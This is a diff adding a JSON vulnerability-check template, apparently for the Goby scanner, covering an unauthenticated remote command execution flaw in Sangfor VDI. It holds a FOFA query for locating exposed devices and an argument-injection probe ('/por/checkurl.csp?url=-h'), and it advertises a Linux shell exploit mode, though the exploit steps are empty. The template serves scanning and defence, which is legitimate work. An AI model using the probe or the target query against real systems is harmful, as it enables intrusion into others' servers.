@@ -1,0 +1,103 @@
+{
+  "Name": "Sangfor VDI unauthorized RCE",
+  "Description": "深信服桌面云解决方案包含虚拟机管理软件VMS、虚拟桌面控制器VDC及瘦终端aDesk三大组件。通过将用户桌面在数据中心集中化运行和管理，降低了运维难度并提高了数据的安全性。攻击者利用该漏洞，可在未授权的情况下向目标服务器发送恶意构造的HTTP请求，从而获得目标服务器的权限，实现远程命令执行。",
+  "Product": "Sangfor VDI",
+  "Homepage": "https://www.sangfor.com.cn/",
+  "DisclosureDate": "2019-08-18",
+  "Author": "itardc@163.com",
+  "FofaQuery": "body=\"/por/login_psw.csp\" && body=\"VDI\" || app=\"Sangfor-SSL-VPN\"",
+  "GobyQuery": "",
+  "Level": "3",
+  "Impact": "攻击者利用该漏洞，可在未授权的情况下向目标服务器发送恶意构造的HTTP请求，从而获得目标服务器的权限，实现远程命令执行。",
+  "Recommendation": "深信服官方已发布更新版本和修复补丁。",
+  "References": [
+    "https://fofa.so"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "AttackType",
+      "type": "select",
+      "value": "goby_shell_linux"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "GET",
+        "uri": "/por/checkurl.csp"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "2",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    },
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "GET",
+        "uri": "/por/checkurl.csp?url=-h"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "1",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": [
+    "rce",
+    "unauthorized"
+  ],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": ["Sangfor-VDI"]
+  }
+}
